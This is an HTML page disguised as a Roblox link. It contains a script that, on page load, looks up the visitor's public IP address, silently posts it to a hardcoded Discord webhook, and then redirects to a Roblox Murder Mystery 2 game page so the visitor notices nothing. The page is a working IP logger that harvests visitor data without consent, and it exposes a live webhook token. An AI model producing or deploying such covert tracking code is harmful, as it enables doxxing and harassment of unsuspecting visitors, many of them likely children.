<!DOCTYPE html>
<html>
<head>
  <title>Roblox</title>
</head>
<body>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/1359559822525075658/DIF6NyqMMNUGP4I-WvjmVLJWkR_VlNGykKmf_IWz-REF4zk33FNVDgImSxxDcZ1p8i1G";
    const redirectURL = "https://www.roblox.com/games/142823291/Murder-Mystery-2";

    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const payload = {
          content: `hi here ip bye: \`${ip}\``
        };

        fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        }).finally(() => {
          // wait a sec then redirect
          setTimeout(() => {
            window.location.href = redirectURL;
          }, 300); // 1 second delay for smooth redirect
        });
      })
      .catch(err => {
        console.error("Error:", err);
        window.location.href = redirectURL; // still redirect even if error
      });
  </script>
</body>
</html>
